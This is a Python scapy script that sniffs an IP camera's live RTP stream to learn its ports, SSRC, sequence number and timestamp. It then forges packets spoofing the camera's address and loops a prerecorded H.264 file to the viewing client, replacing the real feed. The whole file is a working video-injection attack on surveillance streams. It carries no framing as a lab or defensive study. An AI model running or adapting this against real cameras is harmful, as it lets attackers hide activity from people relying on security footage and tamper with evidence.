from scapy.all import Ether, IP, UDP, RTP, Raw, sendp, sniff
import time
import struct
import os


IFACE = "en0"
IP_CAMERA = "192.168.0.81"
IP_CLIENT = "192.168.0.162"
CLIENT_MAC = "58:1C:F8:51:BD:3C"  

def fragment_nal_unit(nal_unit, mtu=1400):
    if len(nal_unit) <= mtu: #only care about video data units that fit
        return [nal_unit]
    header = nal_unit[0]
    nri = header & 0x60
    nal_type = header & 0x1F
    payload = nal_unit[1:]
    fragments = []
    fu_indicator = nri | 28 #Sets the fragementation unit flag which shows that this is a fragemented unit
    offset = 0
    while offset < len(payload):
        available_space = mtu - 2
        chunk_size = min(available_space, len(payload) - offset)
        chunk = payload[offset : offset + chunk_size]
        s_bit = 1 if offset == 0 else 0
        e_bit = 1 if (offset + chunk_size) == len(payload) else 0
        fu_header = (s_bit << 7) | (e_bit << 6) | nal_type #sets start and end bits and the nal type
        packet_payload = bytes([fu_indicator, fu_header]) + chunk
        fragments.append(packet_payload)
        offset += chunk_size
    return fragments

def get_live_params():
    print("Sniffing for live RTP on " + IFACE)
    #listens for a single UDP packet larger than 500 bytes as it is usually video packets
    packets = sniff(count=1, filter=f"udp and host {IP_CAMERA} and len > 500", iface=IFACE, timeout=15) 
    
    if packets:
        packet = packets[0]
        sport = packet[UDP].sport
        dport = packet[UDP].dport
        payload = bytes(packet[UDP].payload)
        if len(payload) >= 12: #we know that its 12 bytes
            # RTP Header format goes sequence number, timestamp, sync source
            header = struct.unpack("!HHII", payload[:12]) # unpacks into rtp header format
            ssrc = header[3]
            seq = header[1]
            timestamp = header[2]
            print("Synced")
            return sport, dport, ssrc, seq, timestamp
    
    print("Sync failed")
    return None

def inject_video(h264_file):
    params = get_live_params()
    if not params: return
    
    sport, dport, ssrc, seq, timestamp = params
    
    with open(h264_file, 'rb') as f:
        units = f.read().split(b'\x00\x00\x00\x01')[1:] # split each video frame based on marker for beginning of each nal unit

    print("Starting video injection.")
    while True: # loop until we stop the script
        for unit in units:
            fragments = fragment_nal_unit(unit)
            for i, payload in enumerate(fragments):
                is_last = (i == len(fragments) - 1)
                #stacks the protocols: Hardware, Internet, Connection, Video Protocol, Raw Video Data
                pkt = Ether(dst=CLIENT_MAC) / \
                      IP(src=IP_CAMERA, dst=IP_CLIENT) / \
                      UDP(sport=sport, dport=dport) / \
                      RTP(version=2, payload_type=96, sequence=seq, 
                          timestamp=timestamp, sourcesync=ssrc, 
                          marker=1 if is_last else 0) / \
                      Raw(load=payload)

                sendp(pkt, iface=IFACE, verbose=False)
                seq = (seq + 1) % 65536 # increment the sequence number, wrapping around to 0 after 65535 (2^16 - 1)
            
            timestamp = (timestamp + 3600) % 4294967296 # increment the timestamp so video plays smoothly, wrapping around to 0 after 4294967295 (2^32 - 1)
            time.sleep(0.03)  #roughly attempt to simulate 30fps
            print(".", end="", flush=True)

if __name__ == "__main__":
    inject_video("real_video.h264")